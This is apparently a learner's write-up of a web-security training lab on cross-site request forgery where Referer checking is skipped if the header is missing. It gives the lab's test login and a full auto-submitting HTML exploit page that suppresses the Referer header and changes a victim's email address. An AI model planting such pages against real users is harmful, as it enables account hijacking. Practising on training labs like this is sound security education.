# Practitioner Lab 86 : CSRF where Referer validation depends on header being present

---

This lab's email change functionality is vulnerable to CSRF. It attempts to block cross domain requests but has an insecure fallback.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials:Â `wiener:peter`

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0af7008303ec36eb8231844e007000bf.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test3&#64;newchangedemail&#46;net" />
      <input type="submit" value="Submit request" />
    </form>
<meta name="referrer" content="never">
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

Using this I tested it on myself and it worked. 

![Untitled](Practitioner%20Lab%2086%20CSRF%20where%20Referer%20validation%20%2018da48eedbaa4598a7d0fefd50330b7e/Untitled.png)

This solved the lab.